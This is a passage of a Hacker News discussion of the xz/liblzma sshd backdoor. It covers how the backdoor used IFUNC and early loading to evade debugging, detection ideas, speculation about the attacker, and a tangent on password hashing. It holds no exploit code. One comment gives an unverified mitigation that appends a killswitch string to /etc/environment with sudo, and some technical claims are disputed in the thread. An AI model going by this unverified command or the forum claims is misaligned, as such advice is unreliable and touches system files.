as opposed to other ways to execute code on library load because it runs very early (before linking tables are remapped read-only). | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39883802)   | [root](#39878872) | [parent](#39882316) | [prev](#39943859) | [next](#39881650) [–]  Sure, but your solution supposes some kind of linking cop program overseeing the linking process, and who is going to keep the linking cop honest? | | --- | --- | --- | | | |  |  | [FeepingCreature](user?id=FeepingCreature) [9 months ago](item?id=39893919)   | [root](#39878872) | [parent](#39883802) | [next](#39883827) [–]  Yes, the dynamic linker (/lib/ld-linux.so.2), which is one relatively short program as opposed to thousands of big ones. :) The point is, there's simply no usecase to require or even allow the program to do IFUNC substitution freely on its own. A programming framework should not opt the developer in to capabilities they don't want or need. Much of C-likes' complexity arises from unnecessary, mandated capabilities. | | --- | --- | --- | | | |  |  | [Cloudef](user?id=Cloudef) [9 months ago](item?id=39883827)   | [root](#39878872) | [parent](#39883802) | [prev](#39893919) | [next](#39881650) [–]  I mean dynamic loader is part of the base system and you generally trust the compiler and linker you build the program with. If any of those are malicious, you've already lost the game. | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39885848)   | [root](#39878872) | [parent](#39883827) | [next](#39881650) [–]  Asking a programmer to trust his own compiler and libraries which he can personally analyze and vouch for (static linking) is much different than asking the programmer to vouch for the dynamic libraries present on some given user’s machine. | | --- | --- | --- | | | |  |  | [intelVISA](user?id=intelVISA) [9 months ago](item?id=39881650)   | [root](#39878872) | [parent](#39880539) | [prev](#39881896) | [next](#39879239) [–]  yep, but how to reverse such a blunder? | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39883819)   | [root](#39878872) | [parent](#39881650) | [next](#39879239) [–]  Well step one is to just stop doing it? I guess someone will need to start publishing a static-only linux distro | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39887898)   | [root](#39878872) | [parent](#39883819) | [next](#39879239) [–]  I think you don't fully understand how the attack works. Had sshd been written in go or rust, the attack would have still been possible. | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39889671)   | [root](#39878872) | [parent](#39887898) | [next](#39879239) [–]  of course, I never wrote otherwise? | | --- | --- | --- | | | |  |  | [x0x0](user?id=x0x0) [9 months ago](item?id=39879239)   | [root](#39878872) | [parent](#39878911) | [prev](#39880539) | [next](#39879197) [11 more]  [flagged] | | --- | --- | --- | | | |  |  | [raggi](user?id=raggi) [9 months ago](item?id=39879282)   | [root](#39878872) | [parent](#39879239) | [next](#39879512) [–]  Think whatever you shall about systemd of course, but please stop with the blind belief mud slinging: ```   - systemd didn't create the patch to include libsystemd, distros did   - current systemd versions already remove liblzma from their dependencies, the affected distros are behind on systemd updates though   - you can implement notify in standalone code in about the same effort as it takes to use the dependency, there wasn't really a good reason for distro's to be adding this dependency to such a critical binary. systemd documents the protocol independently to make this easy. distros having sketchy patches to sshd has a long history, remember the debian weak key fiasco? ``` | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39879405)   | [root](#39878872) | [parent](#39879282) | [next](#39879888) [–]  > - current systemd versions already remove liblzma from their dependencies, the affected distros are behind on systemd updates though The affected distros aren't behind on systemd updates, the change to systemd you describe has been merged but not yet released. | | --- | --- | --- | | | |  |  | [raggi](user?id=raggi) [9 months ago](item?id=39879439)   | [root](#39878872) | [parent](#39879405) | [next](#39879888) [–]  Ah, thank you for the correction! | | --- | --- | --- | | | |  |  | [x0x0](user?id=x0x0) [9 months ago](item?id=39902316)   | [root](#39878872) | [parent](#39879439) | [next](#39879888) [–]  Maybe you should reconsider your "blind belief mud slinging" eh? Be better. | | --- | --- | --- | | | |  |  | [everybackdoor](user?id=everybackdoor) [9 months ago](item?id=39879888)   | [root](#39878872) | [parent](#39879282) | [prev](#39879405) | [next](#39879512) [4 more]  [flagged] | | --- | --- | --- | | | |  |  | [rcxdude](user?id=rcxdude) [9 months ago](item?id=39880166)   | [root](#39878872) | [parent](#39879888) | [next](#39879512) [–]  This is full conspiracy mode thinking. | | --- | --- | --- | | | |  |  | [webmaven](user?id=webmaven) [9 months ago](item?id=39881858)   | [root](#39878872) | [parent](#39880166) | [next](#39879512) [–]  Yes, well, there actually was a conspiracy here, wasn't there? The only question is how extensive it was in time and space. | | --- | --- | --- | | | |  |  | [kimixa](user?id=kimixa) [9 months ago](item?id=39882486)   | [root](#39878872) | [parent](#39881858) | [next](#39879512) [–]  I wonder if the fact they "had" to use a dependency and jump through a number of hoops suggest they're not involved in the conspiracy? As if they had this sort of access and effort surely systemd itself would be an easier target? But that's not saying this is the *only* conspiracy, maybe there's hundreds of other similar things in published code right now, and one was noticed soon after introduction merely due to luck. | | --- | --- | --- | | | |  |  | [pas](user?id=pas) [9 months ago](item?id=39879512)   | [root](#39878872) | [parent](#39879239) | [prev](#39879282) | [next](#39879662) [–]  libselinux also links to liblzma (and gets into sshd via PAM) <https://news.ycombinator.com/item?id=39867126> | | --- | --- | --- | | | |  |  | [cqqxo4zV46cp](user?id=cqqxo4zV46cp) [9 months ago](item?id=39879662)   | [root](#39878872) | [parent](#39879239) | [prev](#39879512) | [next](#39879197) [–]  No. You are still bitter about systemd and are trying to assert blame which does not reasonably exist. | | --- | --- | --- | | | |  |  | [inferiorhuman](user?id=inferiorhuman) [9 months ago](item?id=39879742)   | [root](#39878872) | [parent](#39879662) | [next](#39879197) [–]  I'm not bitter, I'm wary of systemd in a security context. Their vulns seem to be a result of poor choices made deliberately rather than mistakes or sloppy coding (e.g. defaulting to running units as root when the UID/username couldn't be parsed). Lennart was staunchly anti-CVE, which to me seems again like making a deliberate choice that will only hinder a secure implementation. I haven't followed systemd too closely, has their stance on CVEs at least evolved? <https://soylentnews.org/article.pl?sid=17/07/30/0251232> | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39879197)   | [parent](#39878872) | [prev](#39878911) | [next](#39879960) [–]  I think this would’ve been difficult to catch because the patching of sshd happens during linking, when it’s permissible, and if this is correct then it’s not a master key backdoor, so there is no regular login audit trail. And sshd would of course be allowed to start other processes. A very tight SELinux policy could catch sshd executing something that ain’t a shell but hardening to that degree would be extremely rare I assume. As for being discovered outside the target, well we tried that exercise already, didn’t we? A bunch of people stared at the payload with valgrind et al and didn’t see it. It’s also fairly well protected from being discovered in debugging environments, because the overt infrastructure underlying the payload is incompatible with ASan and friends. And even if it is linked in, the code runs long before main(), so even if you were prodding around near or in liblzma with a debugger you wouldn’t normally observe it execute. e: sibling suggests strace, yes you can see all syscalls after the process is spawned and you can watch the linker work. But from what I’ve gathered the payload isn’t making any syscalls at that stage to determine whether to activate, it’s just looking at argv and environ etc. | | --- | --- | --- | | | |  |  | [Deathcrow](user?id=Deathcrow) [9 months ago](item?id=39881789)   | [root](#39878872) | [parent](#39879197) | [next](#39879285) [–]  >A very tight SELinux policy could catch sshd executing something that ain’t a shell but hardening to that degree would be extremely rare I assume. Huh, ssh executes things that aren't shells all the time during normal operation. No? i.e. 'ssh myserver.lan cat /etc/fstab' | | --- | --- | --- | | | |  |  | [sega\_sai](user?id=sega_sai) [9 months ago](item?id=39887425)   | [root](#39878872) | [parent](#39881789) | [next](#39879285) [–]  I believe cat will be executed in the shell. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39879285)   | [root](#39878872) | [parent](#39879197) | [prev](#39881789) | [next](#39879960) [–]  One idea may be to create a patched version of ld-linux itself with added sanity checks while the process loads. For something much more heavy-handed, force the pages in sensitive sections to fault, either in the kernel or in a hypervisor. Then look at where the access is coming from in the page fault handler. I don't think you can reliably differentiate a backdoor executing a command, and a legitimate user logged in with ssh running a command once the backdoor is already installed. But the way backdoors install themselves is where they really break the rules. | | --- | --- | --- | | | |  |  | [nurple](user?id=nurple) [9 months ago](item?id=39879960)   | [parent](#39878872) | [prev](#39879197) | [next](#39878937) [–]  I think one interesting corollary here is how the Ken Thompson attack was discovered at PWB[0] because it had a memory performance bug[1]. ```   [0] https://en.wikipedia.org/wiki/PWB/UNIX   [1] https://news.ycombinator.com/item?id=38020792 ``` | | --- | --- | --- | | | |  |  | [joeyh](user?id=joeyh) [9 months ago](item?id=39878937)   | [parent](#39878872) | [prev](#39879960) | [next](#39878940) [–]  Since a liblzma backdoor could be used to modify compiler packages that are installed on some distributions, it gets right back to a trusting trust attack. Although initial detection via eg strace would be possible, if the backdoor was later removed or went quiescentit would be full trusting trust territory. | | --- | --- | --- | | | |  |  | [ghostpepper](user?id=ghostpepper) [9 months ago](item?id=39879385)   | [root](#39878872) | [parent](#39878937) | [next](#39878940) [–]  How would this be possible? This backdoor works because lzma is loaded into sshd (by a roundabout method involving systemd). I don't think gcc or clang links lzma. | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [9 months ago](item?id=39879727)   | [root](#39878872) | [parent](#39879385) | [next](#39879685) [–]  When the backdoor is loaded by sshd it could modify the gcc/clang install, or some system header file. | | --- | --- | --- | | | |  |  | [joeyh](user?id=joeyh) [9 months ago](item?id=39879685)   | [root](#39878872) | [parent](#39879385) | [prev](#39879727) | [next](#39885805) [–]  dpkg-deb is linked with liblzma | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [9 months ago](item?id=39885805)   | [root](#39878872) | [parent](#39879385) | [prev](#39879685) | [next](#39906163) [–]  To be fair neither does sshd. But I'm sure someone somewhere has a good reason for gcc to write status via journald or something like that? There's however no reason to limit yourself to gcc for a supply chain attack like this. In any non trivial build system, there's going to be lots of third party things involved. Especially when you include tests in the build. Is Python invoked somewhere along the build chain? That's like a dozen libraries loaded already. Nothing is gained from protecting against an exact replica of this attack, but from this family of attacks. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39906163)   | [root](#39878872) | [parent](#39879385) | [prev](#39885805) | [next](#39879572) [–]  the installation process itself executes xz scripts which can make any (?) modifications to the system | | --- | --- | --- | | | |  |  | [slim](user?id=slim) [9 months ago](item?id=39879572)   | [root](#39878872) | [parent](#39879385) | [prev](#39906163) | [next](#39878940) [–]  servers hosting gcc binaries are accessed using ssh | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39878940)   | [parent](#39878872) | [prev](#39878937) | [next](#39882796) [–]  At least for some comic relief I'd like to imagine Jia's boss slapping him and saying something like "you idiot, we worked on this for so many years and you couldn't have checked for any perf issues?" But seriously, we could have found ourselves with this in all stable repos: RHEL, Debian, Ubuntu, IoT devices 5 years from now and it would have been a much larger shit show. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39881405)   | [root](#39878872) | [parent](#39878940) | [next](#39879223) [–]  This was the backdoor we found. We found the backdoor with performance issues. Whats more likely - that this is the only backdoor like this in linux, or that there are more out there and this is the one we happened to find? I really hope someone is out there testing for all of this stuff in linux: - Look for system() calls in compiled binaries and check all of them - Look for uses of IFUNC - specifically when a library uses IFUNC to replace other functions in the resulting executable - Make a list of all the binaries / libraries which don't landlock. Grep the sourcecode of all those projects and make sure none of them *expect* to be using landlock. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39881672)   | [root](#39878872) | [parent](#39881405) | [next](#39879223) [–]  All of this was obfuscated. None of this will be detectable with current static analysis techniques. | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39888553)   | [root](#39878872) | [parent](#39881672) | [next](#39882081) [–]  We have governments, which even in the face of budget crises and such tend to allocate enormous sums for "national security". Why not have them actually do something useful with that for once and do a manual line-by-line audit of all security-critical code that is underpinning our infrastructure? | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39901047)   | [root](#39878872) | [parent](#39888553) | [next](#39882081) [–]  They do this, but probably not as much as they should. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39882081)   | [root](#39878872) | [parent](#39881672) | [prev](#39888553) | [next](#39879223) [–]  IFUNC and landlock could be debugged pretty easily at runtime, just by adding some instrumentation. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39887252)   | [root](#39878872) | [parent](#39882081) | [next](#39879223) [–]  Yes but that requires you to know that someone will use it beforehand. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39889098)   | [root](#39878872) | [parent](#39887252) | [next](#39879223) [–]  Now that we know IFUNC can me misused like this, it would be pretty silly if we allow other, future exploits to use the same trick. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39901059)   | [root](#39878872) | [parent](#39889098) | [next](#39879223) [–]  ifunc was only used because it’s an obscure feature that is little-used and provides a way to convert a backdoor into easy execution. There are many others and it would be silly to try to catch them all. | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39879223)   | [root](#39878872) | [parent](#39878940) | [prev](#39881405) | [next](#39879514) [–]  Maybe they didn't have time to test? They could have been scrambling to make it into timed releases such as Ubuntu 24.04 or Fedora 40. | | --- | --- | --- | | | |  |  | [raggi](user?id=raggi) [9 months ago](item?id=39879301)   | [root](#39878872) | [parent](#39879223) | [next](#39881514) [–]  There is one possible time pressure involved, which is that libsystemd dropped the liblzma dependency | | --- | --- | --- | | | |  |  | [XorNot](user?id=XorNot) [9 months ago](item?id=39879874)   | [root](#39878872) | [parent](#39879301) | [next](#39881514) [–]  Absolutely no intelligence agency would look at a successful compromise where they have a highly positioned agent in an organization like this, and burn them trying to rush an under-developed exploit in that would then become not useful almost immediately (because the liblzma dependency would be dropped next distro upgrade cycle). If you had a human-asset with decision making authority and trust in place, then as funded organization with regular working hours, you'd simply can the project and start prototyping new potential uses. | | --- | --- | --- | | | |  |  | [nequo](user?id=nequo) [9 months ago](item?id=39880524)   | [root](#39878872) | [parent](#39879874) | [next](#39880837) [–]  Might a time-sensitive high-priority goal override such reasoning? For example, the US presidential election is coming up. Making it into Ubuntu LTS could be worth the risk if valuable government targets are running that. | | --- | --- | --- | | | |  |  | [kijin](user?id=kijin) [9 months ago](item?id=39882010)   | [root](#39878872) | [parent](#39880524) | [next](#39880837) [–]  Jia Tan tried to get his backdoored XZ into Ubuntu 24.04 just before the freeze, so that makes sense. Now is about the right time to get it into Fedora if he wants to backdoor RHEL 10, too. But I don't think valuable government targets are in any hurry to upgrade. I wouldn't expect widespread adoption of 24.04, even in the private sector, until well after the U.S. election. By the next election, though, everyone will be running it. Edit: According to another comment [1], there would only have been a short window of vulnerability during which this attack would have worked, due to changes in systemd. This might have increased pressure on the attacker to act quickly. [1] <https://news.ycombinator.com/item?id=39881465> | | --- | --- | --- | | | |  |  | [lobocinza](user?id=lobocinza) [9 months ago](item?id=39880837)   | [root](#39878872) | [parent](#39879874) | [prev](#39880524) | [next](#39880068) [–]  Presumably this intelligence agency have multiple such initiatives and can afford to burn one to achieve a goal. | | --- | --- | --- | | | |  |  | [refulgentis](user?id=refulgentis) [9 months ago](item?id=39880068)   | [root](#39878872) | [parent](#39879874) | [prev](#39880837) | [next](#39881514) [–]  No true Scotsman | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39881514)   | [root](#39878872) | [parent](#39879223) | [prev](#39879301) | [next](#39879514) [–]  On the other hand, this was a two year long con.. | | --- | --- | --- | | | |  |  | [vbezhenar](user?id=vbezhenar) [9 months ago](item?id=39879514)   | [root](#39878872) | [parent](#39878940) | [prev](#39879223) | [next](#39879036) [–]  > But seriously, we could have found ourselves with this in all stable repos: RHEL, Debian, Ubuntu, IoT devices 5 years from now and it would have been a much larger shit show. Think about backdoors that are already present and will never be found out. | | --- | --- | --- | | | |  |  | [chris\_wot](user?id=chris_wot) [9 months ago](item?id=39879036)   | [root](#39878872) | [parent](#39878940) | [prev](#39879514) | [next](#39882796) [–]  Surely this is something the FBI should be involved with? Or some authority? | | --- | --- | --- | | | |  |  | [t0mas88](user?id=t0mas88) [9 months ago](item?id=39882141)   | [root](#39878872) | [parent](#39879036) | [next](#39879076) [–]  Probably the FBI for the public part of it, but if this wasn't a US owned operation you can be sure the CIA/NSA/military will do their own investigation. | | --- | --- | --- | | | |  |  | [colinsane](user?id=colinsane) [9 months ago](item?id=39879076)   | [root](#39878872) | [parent](#39879036) | [prev](#39882141) | [next](#39882796) [–]  sure. what makes you think they aren't? | | --- | --- | --- | | | |  |  | [sitkack](user?id=sitkack) [9 months ago](item?id=39879545)   | [root](#39878872) | [parent](#39879076) | [next](#39882796) [–]  Why would the FBI investigate the NSA? We have zero idea who the actors involved are. | | --- | --- | --- | | | |  |  | [pxc](user?id=pxc) [9 months ago](item?id=39881622)   | [root](#39878872) | [parent](#39879545) | [next](#39879988) [–]  It's not actually unusual for three-letter US agencies to be at odds with one another. But one possible reason is if the FBI is convinced that something the NSA is doing is illegal. They may not always be inclined to tolerate that. | | --- | --- | --- | | | |  |  | [denton-scratch](user?id=denton-scratch) [9 months ago](item?id=39882795)   | [root](#39878872) | [parent](#39881622) | [next](#39882445) [–]  > It's not actually unusual for three-letter US agencies to be at odds with one another. I'd noticed that; this seems to have been the case for a long time. You'd think that having state security agencies at war with one-another would be a disaster, but perhaps it's a feature: a sort of social "layered security". At any rate, it seems much better than having a bunch of state security agencies that all sing from the same songsheet. | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39888595)   | [root](#39878872) | [parent](#39882795) | [next](#39882445) [–]  It's a bog standard practice, actually, even if you look very far back to the ancient world. Having a single agency responsible for security of yourself and what you own is a bad idea because no matter how much you try ensure the loyalty of people in it, it's prone to, at the minimum, suppressing its own failures and magnifying its successes to make itself look better than it actually is, giving you a false sense of security. It is also the natural point from which to orchestrate a coup, which is something that can be used by your adversaries, but even without their involvement people working there eventually realize that they hold all the keys to the kingdom and there's little risk in them just taking over. So rulers in all ages tended to create *multiple* different security apparatuses for themselves and their states, and often actively encouraged rivalries between them, even if that makes them less efficient. | | --- | --- | --- | | | |  |  | [sitkack](user?id=sitkack) [9 months ago](item?id=39882445)   | [root](#39878872) | [parent](#39881622) | [prev](#39882795) | [next](#39879988) [–]  You would have to agree that it was possible for the government to break the law. And what the repercussions are when that happens. | | --- | --- | --- | | | |  |  | [colinsane](user?id=colinsane) [9 months ago](item?id=39879988)   | [root](#39878872) | [parent](#39879545) | [prev](#39881622) | [next](#39882796) [–]  my comment allows for the NSA to be involved in this and for the FBI to not be investigating them. | | --- | --- | --- | | | |  |  | [amelius](user?id=amelius) [9 months ago](item?id=39882796)   | [parent](#39878872) | [prev](#39878940) | [next](#39882803) [–]  Backdoors can be placed in any type of software. For example, a GIMP plugin could connect to your display and read keystrokes, harvest passwords, etcetera. Utilities run by the superuser are of course even more potentially dangerous. Supply-chain attacks like these are just bound to happen. Perhaps not as often in SSH which is heavily scrutinized, but the consequences can be serious nevertheless. | | --- | --- | --- | | | |  |  | [x-yl](user?id=x-yl) [9 months ago](item?id=39882803)   | [parent](#39878872) | [prev](#39882796) | [next](#39882293) [–]  Can I ask for why it wouldn't have been discovered if the obvious delay wasn't present? Wouldn't anyone profiling a running sshd (which I have to imagine *someone* out there is doing) see it spending all its crypto time in liblzma? | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [9 months ago](item?id=39885872)   | [root](#39878872) | [parent](#39882803) | [next](#39882293) [–]  The situation certainly wouldn't be helped by the fact that this exploit targeted the systemd integration used by Debian and Red Hat. OpenSSH developers aren't likely to run that since they already rejected that patch for the increased attack surface. Hard to argue against, in retrospect. The attack also avoids activation under those conditions a profiler or debugger would run under. | | --- | --- | --- | | | |  |  | [geggo98](user?id=geggo98) [9 months ago](item?id=39882293)   | [parent](#39878872) | [prev](#39882803) | [next](#39881018) [–]  Using a jump host could help, only allowing port forwarding. Ideally it would be heavily monitored and create a new instance for every connection (e.g., inside a container). The attacker would then be stuck inside the jump host and would have to probe where to connect next. This hopefully would then trigger an alert, causing some suspicion. A shared instance would allow the attacker to just wait for another connection and then follow its traces, without risking triggering an alert by probing. The ideal jump host would allow to freeze the running ssh process on an alert, either with a snapshot (VM based) or checkpointing (container based), so it can be analyzed later. | | --- | --- | --- | | | |  |  | [sgammon](user?id=sgammon) [9 months ago](item?id=39881018)   | [prev](#39878872) | [next](#39878947) [–]  There appears to be a string encoded in the binary payload: [https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01...](https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01#file-hashes-txt-L115) Which functions as a killswitch: [https://piaille.fr/@zeno/112185928685603910](https://piaille.fr/%40zeno/112185928685603910) If that is indeed the case, one mitigation might be ``` echo "yolAbejyiejuvnup=Evjtgvsh5okmkAvj" | sudo tee -a /etc/environment ``` | | --- | --- | --- | | | |  |  | [sgammon](user?id=sgammon) [9 months ago](item?id=39881432)   | [parent](#39881018) | [next](#39882208) [–]  Make absolutely sure to include `-a` so it doesn't nuke your env file, and generally speaking, one should upgrade to a version without the malicious code and restart, of course. | | --- | --- | --- | | | |  |  | [chii](user?id=chii) [9 months ago](item?id=39884958)   | [root](#39881018) | [parent](#39881432) | [next](#39882208) [–]  > without the malicious code and restart i wonder if the malicious code would've installed a more permanent backdoor elsewhere that would remain after a restart. I recall things like on windows where malware would replace your keyboard drivers or mouse drivers with their own ones that had the malware/virus, so that even if the original malware is removed, the system is never safe again. You'd have to wipe. And this is not even counting any firmware that might've been dropped. | | --- | --- | --- | | | |  |  | [dannyw](user?id=dannyw) [9 months ago](item?id=39882208)   | [parent](#39881018) | [prev](#39881432) | [next](#39878947) [–]  That's so strange. This reeks of nation state actors, wanting ways to protect their own systems. | | --- | --- | --- | | | |  |  | [halJordan](user?id=halJordan) [9 months ago](item?id=39886266)   | [root](#39881018) | [parent](#39882208) | [next](#39884972) [–]  This is a good example of bad logic. It doesn't reek of anything except high quality work. You have an unacknowledged assumption that only nation state actors are capable of high quality work. I think that ultimately you want it to be nation state actors and therefore you see something that a nation state actor would do, so you backtrack that it is a nation state actor. So logically your confirmation bias leads you to affirm the consequent. I only say this because I'm tired of seeing the brazen assertions of how this has to be nation state hackers. It is alluring to have identified a secret underlying common knowledge. Thats why flat-earthers believe theyve uncovered their secret, or chem trail believers have identified that secret, or vaxxers have uncovered the secret which underlies vaccines. But the proof just isn't there. Dont fall into the trap they fell into. | | --- | --- | --- | | | |  |  | [chii](user?id=chii) [9 months ago](item?id=39884972)   | [root](#39881018) | [parent](#39882208) | [prev](#39886266) | [next](#39882807) [–]  if you need to test your own malware that you're developing, do you really want to just run it and disrupt your own system? It's not uncommon to put in a check that allows the malware to run but be a noop. | | --- | --- | --- | | | |  |  | [ddalex](user?id=ddalex) [9 months ago](item?id=39882807)   | [root](#39881018) | [parent](#39882208) | [prev](#39884972) | [next](#39878947) [–]  any competent malware dev would have a panic switch... | | --- | --- | --- | | | |  |  | [chatmasta](user?id=chatmasta) [9 months ago](item?id=39878947)   | [prev](#39881018) | [next](#39883063) [–]  Can someone explain succinctly what the backdoor *does*? Do we even know yet? The backdoor itself is not a payload, right? Does it need a malicious archive to exploit it? Or does it hook into the sshd process to listen for malicious packets from a remote attacker? The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? Surely if we can reverse the code we can write a PoC? Basically, how does an attacker control a machine with this backdoor on it? | | --- | --- | --- | | | |  |  | [swid](user?id=swid) [9 months ago](item?id=39879082)   | [parent](#39878947) | [next](#39879135) [–]  You can imagine a door that opens if you knock on it just right. For anyone without the secret knock, it appears and functions as a wall. Without the secret knock, there might not even be a way to prove it opens at all. This is sort of the situation here. xz tries to decode some data before it does anything shady; since it is asymmetric; it can do the decryption without providing the secret encryption key (it has the public counterpart). The exploit code may never be available, because it is not practical to find the secret key, and it doesn't do anything obviously different if the payload doesn't decrypt successfully. The only way to produce the exploit code would be if the secret key is found somehow; and the only real way for that to happen would be for the people who developed the backdoor to leak it. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39880280)   | [root](#39878947) | [parent](#39879082) | [next](#39880626) [–]  *Private* key. In cryptography we distinguish keys which are symmetric (needed by both parties and unavailable to everyone else) as "Secret" keys, with the pair of keys used in public key cryptography identified as the Private key (typically known only to one person/ system/ whatever) and Public key (known to anybody who cares) Thus, in most of today's systems today your password is a *secret*. You know your password and so does the system authenticating you. In contrast the crucial key for a web site's HTTPS is *private*. Visitors don't know this key, the people issuing the certificate don't know it, only the site itself has the key. I remember this by the lyrics to "The Fly" by the band U2, "They say a secret is something you tell one other person. So I'm telling you, child". | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39882131)   | [root](#39878947) | [parent](#39880280) | [next](#39882032) [–]  Private keys are also “secrets” here in the security world. “Vault secures, stores, and tightly controls access to tokens, passwords, certificates, API keys, and other secrets in modern computing” Your distinction is not shared by the industry so it’s not something helpful to correct people on. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39884179)   | [root](#39878947) | [parent](#39882131) | [next](#39882032) [–]  I don't think I can take seriously in this context a quote in which certificates (a type of public document) are also designated "secrets". Like, sure, they're probably thinking of PKCS#12 files which actually have the private key inside them, not just the certificate, but when they are this sloppy of *course* they're going to use the wrong words. | | --- | --- | --- | | | |  |  | [forty](user?id=forty) [9 months ago](item?id=39882032)   | [root](#39878947) | [parent](#39880280) | [prev](#39882131) | [next](#39880440) [–]  I have often seen the secret component of an asymmetric key pair referred as secret key as well. See libsodium for example. Maybe it's because curve/ed 25519 secrets are 32 random bytes unlike RSA keys which have specific structure which makes them distinct from generic secrets. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39882556)   | [root](#39878947) | [parent](#39882032) | [next](#39880440) [–]  It also allows "pk" and "sk" as overly short variable names, an argument developpers are sometimes tempted by! | | --- | --- | --- | | | |  |  | [forty](user?id=forty) [9 months ago](item?id=39885030)   | [root](#39878947) | [parent](#39882556) | [next](#39880440) [–]  Absolutely, it's very convenient when working on a whiteboard :) | | --- | --- | --- | | | |  |  | [SV\_BubbleTime](user?id=SV_BubbleTime) [9 months ago](item?id=39880440)   | [root](#39878947) | [parent](#39880280) | [prev](#39882032) | [next](#39880626) [–]  > You know your password and so does the system authenticating you. Nitpick, but no it shouldn’t. The HASH of your password is recorded. You never submit your password, you submit that hash and they compare it. The difference is that there is no two passwords that collide; but there are hashes that may. And that two equal passwords from two equal users are not necessarily accessible to someone with the hash list because they are modified at rest with salts. | | --- | --- | --- | | | |  |  | [kevincox](user?id=kevincox) [9 months ago](item?id=39880796)   | [root](#39878947) | [parent](#39880440) | [next](#39882341) [–]  To really nitpick the server does have the password during authentication. The alternate would be a PAKE which is currently quite rare. (But probably should become the standard) | | --- | --- | --- | | | |  |  | [SV\_BubbleTime](user?id=SV_BubbleTime) [9 months ago](item?id=39884575)   | [root](#39878947) | [parent](#39880796) | [next](#39882341) [–]  I was going more for *shouldn’t*. You’re right, but for zero knowledge things like password managers where they specifically do not want your password. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39886880)   | [root](#39878947) | [parent](#39884575) | [next](#39882341) [–]  I am aware of PAKEs, and I decided not to waste my time mentioning them because as usual the situation is: Using a PAKE correctly would be safe, but that sounds like work Just saying "Use a good password" is no work and you can *pretend* it's just as safe. Real world systems using a PAKE are very rare. The most notable is WPA3 (and there are numerous scenarios where it's for nothing until WPA2 is long obsolete). Lots of systems which would use a PAKE if designed by a cryptographer were instead designed by engineers or managers for whom "Ooh, a hash with *salt*" sounds like a sophisticated modern technical solution rather than a long obsolete one. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39882341)   | [root](#39878947) | [parent](#39880440) | [prev](#39880796) | [next](#39881790) [–]  > You never submit your password, you submit that hash and they compare it. That's not true. If that were the case, the hash is now the password and the server stores it in clear text. It defeats the entire purpose of hashing passwords. Side note: that is (almost) how NTLM authentication works and why pass-the-hash is a thing in Windows networks. | | --- | --- | --- | | | |  |  | [AnonHP](user?id=AnonHP) [9 months ago](item?id=39881790)   | [root](#39878947) | [parent](#39880440) | [prev](#39882341) | [next](#39881283) [–]  > Nitpick, but no it shouldn’t. The HASH of your password is recorded. You never submit your password, you submit that hash and they compare it. Nitpick, but the password is submitted as-is by most client applications, and the server hashes the submitted password and compares it with the hash it has (of course, with salting). | | --- | --- | --- | | | |  |  | [armada651](user?id=armada651) [9 months ago](item?id=39882157)   | [root](#39878947) | [parent](#39881790) | [next](#39881283) [–]  > Nitpick, but the password is submitted as-is by most client applications, and the server hashes the submitted password and compares it with the hash it has (of course, with salting). I never understood why clients are coded this way. It's trivially easy to send the salt to the client and have it do the hashing. Though I guess it doesn't really improve security in a lot of cases, because if you successfully MITM a web app you can just serve a compromised client. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [9 months ago](item?id=39882358)   | [root](#39878947) | [parent](#39882157) | [next](#39881283) [–]  > I never understood why clients are coded this way. Because it makes things less secure. If it was sufficient to send the hash to the server to authenticate, and the server simply compares the hash sent by the user with the hash in its database, then the hash as actually the password. An attacker doesn't need to know the password anymore, as the hash is sufficient. Hashing was introduced precisely because some vulnerabilities allow read access to the database. With hashed passwords, the attacker in such a situation has to perform a password guessing attack first to proceed. If it was sufficient to send the hash for authentication, the attacker would not need to guess anything. | | --- | --- | --- | | | |  |  | [jamwil](user?id=jamwil) [9 months ago](item?id=39881283)   | [root](#39878947) | [parent](#39880440) | [prev](#39881790) | [next](#39880626) [–]  More an implementation detail than a conceptual distinction, though. | 